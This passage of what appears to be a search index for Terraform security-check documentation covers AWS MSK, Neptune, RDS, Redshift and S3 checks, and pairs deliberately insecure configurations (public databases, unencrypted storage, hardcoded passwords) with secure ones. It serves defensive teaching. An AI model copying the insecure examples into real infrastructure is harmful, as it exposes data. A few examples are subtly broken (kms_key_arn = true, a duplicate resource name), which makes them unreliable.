\"example\"\n   kafka_version          = \"2.4.1\"\n   number_of_broker_nodes = 3\n\n   broker_node_group_info {\n     instance_type   = \"kafka.m5.large\"\n     ebs_volume_size = 1000\n     client_subnets = [\n       aws_subnet.subnet_az1.id,\n       aws_subnet.subnet_az2.id,\n       aws_subnet.subnet_az3.id,\n     ]\n     security_groups = [aws_security_group.sg.id]\n   }\n\n   logging_info {\n     broker_logs {\n       firehose {\n         enabled         = false\n         delivery_stream = aws_kinesis_firehose_delivery_stream.test_stream.name\n       }\n       s3 {\n         enabled = true\n         bucket  = aws_s3_bucket.bucket.id\n         prefix  = \"logs/msk-\"\n       }\n     }\n   }\n\n   tags = {\n     foo = \"bar\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/msk/enable-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/msk_cluster#</p> </li> <li> <p>https://docs.aws.amazon.com/msk/latest/developerguide/msk-logging.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/neptune/","text":"","title":"neptune"},{"location":"checks/aws/neptune/#checks","text":"<ul> <li> <p>enable-log-export Neptune logs export should be enabled</p> </li> <li> <p>enable-storage-encryption Neptune storage must be encrypted at rest</p> </li> <li> <p>encryption-customer-key Neptune encryption should use Customer Managed Keys</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/neptune/enable-log-export/","text":"","title":"Neptune logs export should be enabled"},{"location":"checks/aws/neptune/enable-log-export/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/neptune/enable-log-export/#explanation","text":"<p>Neptune does not have auditing by default. To ensure that you are able to accurately audit the usage of your Neptune instance you should enable export logs.</p>","title":"Explanation"},{"location":"checks/aws/neptune/enable-log-export/#possible-impact","text":"<p>Limited visibility of audit trail for changes to Neptune</p>","title":"Possible Impact"},{"location":"checks/aws/neptune/enable-log-export/#suggested-resolution","text":"<p>Enable export logs</p>","title":"Suggested Resolution"},{"location":"checks/aws/neptune/enable-log-export/#insecure-example","text":"<p>The following example will fail the aws-neptune-enable-log-export check. <pre><code> resource \"aws_neptune_cluster\" \"bad_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   enable_cloudwatch_logs_exports      = []\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/neptune/enable-log-export/#secure-example","text":"<p>The following example will pass the aws-neptune-enable-log-export check. <pre><code> resource \"aws_neptune_cluster\" \"good_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   enable_cloudwatch_logs_exports      = [\"audit\"]\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/neptune/enable-log-export/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#enable_cloudwatch_logs_exports</p> </li> <li> <p>https://docs.aws.amazon.com/neptune/latest/userguide/auditing.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/neptune/enable-storage-encryption/","text":"","title":"Neptune storage must be encrypted at rest"},{"location":"checks/aws/neptune/enable-storage-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/neptune/enable-storage-encryption/#explanation","text":"<p>Encryption of Neptune storage ensures that if their is compromise of the disks, the data is still protected.</p>","title":"Explanation"},{"location":"checks/aws/neptune/enable-storage-encryption/#possible-impact","text":"<p>Unencrypted sensitive data is vulnerable to compromise.</p>","title":"Possible Impact"},{"location":"checks/aws/neptune/enable-storage-encryption/#suggested-resolution","text":"<p>Enable encryption of Neptune storage</p>","title":"Suggested Resolution"},{"location":"checks/aws/neptune/enable-storage-encryption/#insecure-example","text":"<p>The following example will fail the aws-neptune-enable-storage-encryption check. <pre><code> resource \"aws_neptune_cluster\" \"bad_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/neptune/enable-storage-encryption/#secure-example","text":"<p>The following example will pass the aws-neptune-enable-storage-encryption check. <pre><code> resource \"aws_neptune_cluster\" \"good_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = true\n   kms_key_arn                         = aws_kms_key.example.arn\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/neptune/enable-storage-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted</p> </li> <li> <p>https://docs.aws.amazon.com/neptune/latest/userguide/encrypt.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/neptune/encryption-customer-key/","text":"","title":"Neptune encryption should use Customer Managed Keys"},{"location":"checks/aws/neptune/encryption-customer-key/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/neptune/encryption-customer-key/#explanation","text":"<p>Encryption using AWS keys provides protection for your Neptune underlying storage. To increase control of the encryption and manage factors like rotation use customer managed keys.</p>","title":"Explanation"},{"location":"checks/aws/neptune/encryption-customer-key/#possible-impact","text":"<p>Using AWS managed keys does not allow for fine grained control</p>","title":"Possible Impact"},{"location":"checks/aws/neptune/encryption-customer-key/#suggested-resolution","text":"<p>Enable encryption using customer managed keys</p>","title":"Suggested Resolution"},{"location":"checks/aws/neptune/encryption-customer-key/#insecure-example","text":"<p>The following example will fail the aws-neptune-encryption-customer-key check. <pre><code> resource \"aws_neptune_cluster\" \"bad_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/neptune/encryption-customer-key/#secure-example","text":"<p>The following example will pass the aws-neptune-encryption-customer-key check. <pre><code> resource \"aws_neptune_cluster\" \"good_example\" {\n   cluster_identifier                  = \"neptune-cluster-demo\"\n   engine                              = \"neptune\"\n   backup_retention_period             = 5\n   preferred_backup_window             = \"07:00-09:00\"\n   skip_final_snapshot                 = true\n   iam_database_authentication_enabled = true\n   apply_immediately                   = true\n   storage_encrypted                   = true\n   kms_key_arn                         = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/neptune/encryption-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/neptune_cluster#storage_encrypted</p> </li> <li> <p>https://docs.aws.amazon.com/neptune/latest/userguide/encrypt.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/rds/","text":"","title":"rds"},{"location":"checks/aws/rds/#checks","text":"<ul> <li> <p>enable-performance-insights Enable Performance Insights to detect potential problems</p> </li> <li> <p>enable-performance-insights-encryption Encryption for RDS Performance Insights should be enabled.</p> </li> <li> <p>encrypt-cluster-storage-data There is no encryption specified or encryption is disabled on the RDS Cluster.</p> </li> <li> <p>encrypt-instance-storage-data RDS encryption has not been enabled at a DB Instance level.</p> </li> <li> <p>no-classic-resources AWS Classic resource usage.</p> </li> <li> <p>no-public-db-access A database resource is marked as publicly accessible.</p> </li> <li> <p>specify-backup-retention RDS Cluster and RDS instance should have backup retention longer than default 1 day</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/rds/enable-performance-insights/","text":"","title":"Enable Performance Insights to detect potential problems"},{"location":"checks/aws/rds/enable-performance-insights/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/rds/enable-performance-insights/#explanation","text":"<p>Enabling Performance insights allows for greater depth in monitoring data.</p> <p>For example, information about active sessions could help diagose a compromise or assist in the investigation</p>","title":"Explanation"},{"location":"checks/aws/rds/enable-performance-insights/#possible-impact","text":"<p>Without adequate monitoring, performance related issues may go unreported and potentially lead to compromise.</p>","title":"Possible Impact"},{"location":"checks/aws/rds/enable-performance-insights/#suggested-resolution","text":"<p>Enable performance insights</p>","title":"Suggested Resolution"},{"location":"checks/aws/rds/enable-performance-insights/#insecure-example","text":"<p>The following example will fail the aws-rds-enable-performance-insights check. <pre><code>resource \"aws_rds_cluster_instance\" \"bad_example\" {\n    name = \"bar\"\n    performance_insights_enabled = false\n    performance_insights_kms_key_id = \"\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/rds/enable-performance-insights/#secure-example","text":"<p>The following example will pass the aws-rds-enable-performance-insights check. <pre><code>resource \"aws_rds_cluster_instance\" \"good_example\" {\n    name = \"bar\"\n    performance_insights_enabled = true\n    performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/rds/enable-performance-insights/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id</p> </li> <li> <p>https://aws.amazon.com/rds/performance-insights/</p> </li> </ul>","title":"Links"},{"location":"checks/aws/rds/enable-performance-insights-encryption/","text":"","title":"Encryption for RDS Performance Insights should be enabled."},{"location":"checks/aws/rds/enable-performance-insights-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/rds/enable-performance-insights-encryption/#explanation","text":"<p>When enabling Performance Insights on an RDS cluster or RDS DB Instance, and encryption key should be provided.</p> <p>The encryption key specified in <code>performance_insights_kms_key_id</code> references a KMS ARN</p>","title":"Explanation"},{"location":"checks/aws/rds/enable-performance-insights-encryption/#possible-impact","text":"<p>Data can be read from the RDS Performance Insights if it is compromised</p>","title":"Possible Impact"},{"location":"checks/aws/rds/enable-performance-insights-encryption/#suggested-resolution","text":"<p>Enable encryption for RDS clusters and instances</p>","title":"Suggested Resolution"},{"location":"checks/aws/rds/enable-performance-insights-encryption/#insecure-example","text":"<p>The following example will fail the aws-rds-enable-performance-insights-encryption check. <pre><code>resource \"aws_rds_cluster_instance\" \"bad_example\" {\n    name = \"bar\"\n    performance_insights_enabled = true\n    performance_insights_kms_key_id = \"\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/rds/enable-performance-insights-encryption/#secure-example","text":"<p>The following example will pass the aws-rds-enable-performance-insights-encryption check. <pre><code>resource \"aws_rds_cluster_instance\" \"good_example\" {\n    name = \"bar\"\n    performance_insights_enabled = true\n    performance_insights_kms_key_id = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/rds/enable-performance-insights-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster_instance#performance_insights_kms_key_id</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#performance_insights_kms_key_id</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.htm</p> </li> </ul>","title":"Links"},{"location":"checks/aws/rds/encrypt-cluster-storage-data/","text":"","title":"There is no encryption specified or encryption is disabled on the RDS Cluster."},{"location":"checks/aws/rds/encrypt-cluster-storage-data/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/rds/encrypt-cluster-storage-data/#explanation","text":"<p>Encryption should be enabled for an RDS Aurora cluster. </p> <p>When enabling encryption by setting the kms_key_id, the storage_encrypted must also be set to true.</p>","title":"Explanation"},{"location":"checks/aws/rds/encrypt-cluster-storage-data/#possible-impact","text":"<p>Data can be read from the RDS cluster if it is compromised</p>","title":"Possible Impact"},{"location":"checks/aws/rds/encrypt-cluster-storage-data/#suggested-resolution","text":"<p>Enable encryption for RDS clusters</p>","title":"Suggested Resolution"},{"location":"checks/aws/rds/encrypt-cluster-storage-data/#insecure-example","text":"<p>The following example will fail the aws-rds-encrypt-cluster-storage-data check. <pre><code> resource \"aws_rds_cluster\" \"bad_example\" {\n   name       = \"bar\"\n   kms_key_id = \"\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/rds/encrypt-cluster-storage-data/#secure-example","text":"<p>The following example will pass the aws-rds-encrypt-cluster-storage-data check. <pre><code> resource \"aws_rds_cluster\" \"good_example\" {\n   name              = \"bar\"\n   kms_key_id  = \"arn:aws:kms:us-west-2:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab\"\n   storage_encrypted = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/rds/encrypt-cluster-storage-data/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/rds/encrypt-instance-storage-data/","text":"","title":"RDS encryption has not been enabled at a DB Instance level."},{"location":"checks/aws/rds/encrypt-instance-storage-data/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/rds/encrypt-instance-storage-data/#explanation","text":"<p>Encryption should be enabled for an RDS Database instances. </p> <p>When enabling encryption by setting the kms_key_id.</p>","title":"Explanation"},{"location":"checks/aws/rds/encrypt-instance-storage-data/#possible-impact","text":"<p>Data can be read from RDS instances if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/rds/encrypt-instance-storage-data/#suggested-resolution","text":"<p>Enable encryption for RDS instances</p>","title":"Suggested Resolution"},{"location":"checks/aws/rds/encrypt-instance-storage-data/#insecure-example","text":"<p>The following example will fail the aws-rds-encrypt-instance-storage-data check. <pre><code> resource \"aws_db_instance\" \"bad_example\" {\n\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/rds/encrypt-instance-storage-data/#secure-example","text":"<p>The following example will pass the aws-rds-encrypt-instance-storage-data check. <pre><code> resource \"aws_db_instance\" \"good_example\" {\n    storage_encrypted  = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/rds/encrypt-instance-storage-data/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/rds/no-classic-resources/","text":"","title":"AWS Classic resource usage."},{"location":"checks/aws/rds/no-classic-resources/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/rds/no-classic-resources/#explanation","text":"<p>AWS Classic resources run in a shared environment with infrastructure owned by other AWS customers. You should run resources in a VPC instead.</p>","title":"Explanation"},{"location":"checks/aws/rds/no-classic-resources/#possible-impact","text":"<p>Classic resources are running in a shared environment with other customers</p>","title":"Possible Impact"},{"location":"checks/aws/rds/no-classic-resources/#suggested-resolution","text":"<p>Switch to VPC resources</p>","title":"Suggested Resolution"},{"location":"checks/aws/rds/no-classic-resources/#insecure-example","text":"<p>The following example will fail the aws-rds-no-classic-resources check. <pre><code> resource \"aws_db_security_group\" \"bad_example\" {\n   # ...\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/rds/no-classic-resources/#secure-example","text":"<p>The following example will pass the aws-rds-no-classic-resources check. <pre><code> resource \"aws_security_group\" \"good_example\" {\n   # ...\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/rds/no-classic-resources/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_security_group</p> </li> <li> <p>https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-classic-platform.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/rds/no-public-db-access/","text":"","title":"A database resource is marked as publicly accessible."},{"location":"checks/aws/rds/no-public-db-access/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/rds/no-public-db-access/#explanation","text":"<p>Database resources should not publicly available. You should limit all access to the minimum that is required for your application to function.</p>","title":"Explanation"},{"location":"checks/aws/rds/no-public-db-access/#possible-impact","text":"<p>The database instance is publicly accessible</p>","title":"Possible Impact"},{"location":"checks/aws/rds/no-public-db-access/#suggested-resolution","text":"<p>Set the database to not be publicly accessible</p>","title":"Suggested Resolution"},{"location":"checks/aws/rds/no-public-db-access/#insecure-example","text":"<p>The following example will fail the aws-rds-no-public-db-access check. <pre><code> resource \"aws_db_instance\" \"bad_example\" {\n    publicly_accessible = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/rds/no-public-db-access/#secure-example","text":"<p>The following example will pass the aws-rds-no-public-db-access check. <pre><code> resource \"aws_db_instance\" \"good_example\" {\n    publicly_accessible = false\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/rds/no-public-db-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_VPC.WorkingWithRDSInstanceinaVPC.html#USER_VPC.Hiding</p> </li> </ul>","title":"Links"},{"location":"checks/aws/rds/specify-backup-retention/","text":"","title":"RDS Cluster and RDS instance should have backup retention longer than default 1 day"},{"location":"checks/aws/rds/specify-backup-retention/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/rds/specify-backup-retention/#explanation","text":"<p>RDS backup retention for clusters defaults to 1 day, this may not be enough to identify and respond to an issue. Backup retention periods should be set to a period that is a balance on cost and limiting risk.</p>","title":"Explanation"},{"location":"checks/aws/rds/specify-backup-retention/#possible-impact","text":"<p>Potential loss of data and short opportunity for recovery</p>","title":"Possible Impact"},{"location":"checks/aws/rds/specify-backup-retention/#suggested-resolution","text":"<p>Explicitly set the retention period to greater than the default</p>","title":"Suggested Resolution"},{"location":"checks/aws/rds/specify-backup-retention/#insecure-example","text":"<p>The following example will fail the aws-rds-specify-backup-retention check. <pre><code> resource \"aws_db_instance\" \"bad_example\" {\n    allocated_storage    = 10\n    engine               = \"mysql\"\n    engine_version       = \"5.7\"\n    instance_class       = \"db.t3.micro\"\n    name                 = \"mydb\"\n    username             = \"foo\"\n    password             = \"foobarbaz\"\n    parameter_group_name = \"default.mysql5.7\"\n    skip_final_snapshot  = true\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/rds/specify-backup-retention/#secure-example","text":"<p>The following example will pass the aws-rds-specify-backup-retention check. <pre><code> resource \"aws_rds_cluster\" \"good_example\" {\n    cluster_identifier      = \"aurora-cluster-demo\"\n    engine                  = \"aurora-mysql\"\n    engine_version          = \"5.7.mysql_aurora.2.03.2\"\n    availability_zones      = [\"us-west-2a\", \"us-west-2b\", \"us-west-2c\"]\n    database_name           = \"mydb\"\n    master_username         = \"foo\"\n    master_password         = \"bar\"\n    backup_retention_period = 5\n    preferred_backup_window = \"07:00-09:00\"\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/rds/specify-backup-retention/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/rds_cluster#backup_retention_period</p> </li> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/db_instance#backup_retention_period</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/USER_WorkingWithAutomatedBackups.html#USER_WorkingWithAutomatedBackups.BackupRetention</p> </li> </ul>","title":"Links"},{"location":"checks/aws/redshift/","text":"","title":"redshift"},{"location":"checks/aws/redshift/#checks","text":"<ul> <li> <p>encryption-customer-key Redshift clusters should use at rest encryption</p> </li> <li> <p>use-vpc Redshift cluster should be deployed into a specific VPC</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/redshift/encryption-customer-key/","text":"","title":"Redshift clusters should use at rest encryption"},{"location":"checks/aws/redshift/encryption-customer-key/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/redshift/encryption-customer-key/#explanation","text":"<p>Redshift clusters that contain sensitive data or are subject to regulation should be encrypted at rest to prevent data leakage should the infrastructure be compromised.</p>","title":"Explanation"},{"location":"checks/aws/redshift/encryption-customer-key/#possible-impact","text":"<p>Data may be leaked if infrastructure is compromised</p>","title":"Possible Impact"},{"location":"checks/aws/redshift/encryption-customer-key/#suggested-resolution","text":"<p>Enable encryption using CMK</p>","title":"Suggested Resolution"},{"location":"checks/aws/redshift/encryption-customer-key/#insecure-example","text":"<p>The following example will fail the aws-redshift-encryption-customer-key check. <pre><code> resource \"aws_redshift_cluster\" \"bad_example\" {\n   cluster_identifier = \"tf-redshift-cluster\"\n   database_name      = \"mydb\"\n   master_username    = \"foo\"\n   master_password    = \"Mustbe8characters\"\n   node_type          = \"dc1.large\"\n   cluster_type       = \"single-node\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/redshift/encryption-customer-key/#secure-example","text":"<p>The following example will pass the aws-redshift-encryption-customer-key check. <pre><code> resource \"aws_kms_key\" \"redshift\" {\n    enable_key_rotation = true\n }\n\n resource \"aws_redshift_cluster\" \"good_example\" {\n   cluster_identifier = \"tf-redshift-cluster\"\n   database_name      = \"mydb\"\n   master_username    = \"foo\"\n   master_password    = \"Mustbe8characters\"\n   node_type          = \"dc1.large\"\n   cluster_type       = \"single-node\"\n   encrypted          = true\n   kms_key_id         = aws_kms_key.redshift.key_id\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/redshift/encryption-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#encrypted</p> </li> <li> <p>https://docs.aws.amazon.com/redshift/latest/mgmt/working-with-db-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/redshift/use-vpc/","text":"","title":"Redshift cluster should be deployed into a specific VPC"},{"location":"checks/aws/redshift/use-vpc/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/redshift/use-vpc/#explanation","text":"<p>Redshift clusters that are created without subnet details will be created in EC2 classic mode, meaning that they will be outside of a known VPC and running in tennant.</p> <p>In order to benefit from the additional security features achieved with using an owned VPC, the subnet should be set.</p>","title":"Explanation"},{"location":"checks/aws/redshift/use-vpc/#possible-impact","text":"<p>Redshift cluster does not benefit from VPC security if it is deployed in EC2 classic mode</p>","title":"Possible Impact"},{"location":"checks/aws/redshift/use-vpc/#suggested-resolution","text":"<p>Deploy Redshift cluster into a non default VPC</p>","title":"Suggested Resolution"},{"location":"checks/aws/redshift/use-vpc/#insecure-example","text":"<p>The following example will fail the aws-redshift-use-vpc check. <pre><code> resource \"aws_redshift_cluster\" \"bad_example\" {\n    cluster_identifier = \"tf-redshift-cluster\"\n    database_name      = \"mydb\"\n    master_username    = \"foo\"\n    master_password    = \"Mustbe8characters\"\n    node_type          = \"dc1.large\"\n    cluster_type       = \"single-node\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/redshift/use-vpc/#secure-example","text":"<p>The following example will pass the aws-redshift-use-vpc check. <pre><code> resource \"aws_redshift_cluster\" \"good_example\" {\n    cluster_identifier = \"tf-redshift-cluster\"\n    database_name      = \"mydb\"\n    master_username    = \"foo\"\n    master_password    = \"Mustbe8characters\"\n    node_type          = \"dc1.large\"\n    cluster_type       = \"single-node\"\n\n    cluster_subnet_group_name = \"redshift_subnet\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/redshift/use-vpc/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/redshift_cluster#cluster_subnet_group_name</p> </li> <li> <p>https://docs.aws.amazon.com/redshift/latest/mgmt/managing-clusters-vpc.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/","text":"","title":"s3"},{"location":"checks/aws/s3/#checks","text":"<ul> <li> <p>block-public-acls S3 Access block should block public ACL</p> </li> <li> <p>block-public-policy S3 Access block should block public policy</p> </li> <li> <p>enable-bucket-encryption Unencrypted S3 bucket.</p> </li> <li> <p>enable-bucket-logging S3 Bucket does not have logging enabled.</p> </li> <li> <p>enable-versioning S3 Data should be versioned</p> </li> <li> <p>encryption-customer-key S3 encryption should use Customer Managed Keys</p> </li> <li> <p>ignore-public-acls S3 Access Block should Ignore Public Acl</p> </li> <li> <p>no-public-access-with-acl S3 Buckets not publicly accessible through ACL.</p> </li> <li> <p>no-public-buckets S3 Access block should restrict public bucket to limit access</p> </li> <li> <p>specify-public-access-block S3 buckets should each define an aws_s3_bucket_public_access_block</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/s3/block-public-acls/","text":"","title":"S3 Access block should block public ACL"},{"location":"checks/aws/s3/block-public-acls/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/s3/block-public-acls/#explanation","text":"<p>S3 buckets should block public ACLs on buckets and any objects they contain. By blocking, PUTs with fail if the object has any public ACL a.</p>","title":"Explanation"},{"location":"checks/aws/s3/block-public-acls/#possible-impact","text":"<p>PUT calls with public ACLs specified can make objects public</p>","title":"Possible Impact"},{"location":"checks/aws/s3/block-public-acls/#suggested-resolution","text":"<p>Enable blocking any PUT calls with a public ACL specified</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/block-public-acls/#insecure-example","text":"<p>The following example will fail the aws-s3-block-public-acls check. <pre><code>resource \"aws_s3_bucket\" \"bad_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.bad_example.id\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/block-public-acls/#secure-example","text":"<p>The following example will pass the aws-s3-block-public-acls check. <pre><code>resource \"aws_s3_bucket\" \"good_example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket = aws_s3_bucket.good_example.id\n  block_public_acls = true\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/block-public-acls/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_acls</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/block-public-policy/","text":"","title":"S3 Access block should block public policy"},{"location":"checks/aws/s3/block-public-policy/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/s3/block-public-policy/#explanation","text":"<p>S3 bucket policy should have block public policy to prevent users from putting a policy that enable public access.</p>","title":"Explanation"},{"location":"checks/aws/s3/block-public-policy/#possible-impact","text":"<p>Users could put a policy that allows public access</p>","title":"Possible Impact"},{"location":"checks/aws/s3/block-public-policy/#suggested-resolution","text":"<p>Prevent policies that allow public access being PUT</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/block-public-policy/#insecure-example","text":"<p>The following example will fail the aws-s3-block-public-policy check. <pre><code>resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"bad_example\" {\n  bucket = aws_s3_bucket.example.id \n  block_public_policy = false\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/block-public-policy/#secure-example","text":"<p>The following example will pass the aws-s3-block-public-policy check. <pre><code>resource \"aws_s3_bucket\" \"example\" {\n  bucket = \"mybucket\"\n}\n\nresource \"aws_s3_bucket_public_access_block\" \"good_example\" {\n  bucket = aws_s3_bucket.example.id \n  block_public_policy = true \n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/s3/block-public-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/s3_bucket_public_access_block#block_public_policy</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/dev-retired/access-control-block-public-access.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/s3/enable-bucket-encryption/","text":"","title":"Unencrypted S3 bucket."},{"location":"checks/aws/s3/enable-bucket-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/s3/enable-bucket-encryption/#explanation","text":"<p>S3 Buckets should be encrypted to protect the data that is stored within them if access is compromised.</p>","title":"Explanation"},{"location":"checks/aws/s3/enable-bucket-encryption/#possible-impact","text":"<p>The bucket objects could be read if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/s3/enable-bucket-encryption/#suggested-resolution","text":"<p>Configure bucket encryption</p>","title":"Suggested Resolution"},{"location":"checks/aws/s3/enable-bucket-encryption/#insecure-example","text":"<p>The following example will fail the aws-s3-enable-bucket-encryption check. <pre><code> resource \"aws_s3_bucket\" \"bad_example\" {\n   bucket = \"mybucket\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/s3/enable-bucket-encryption/#secure-example","text":"<p>The following example will pass the aws-s3-enable-bucket-encryption check. <pre><code> resource \"aws_s3_bucket\" 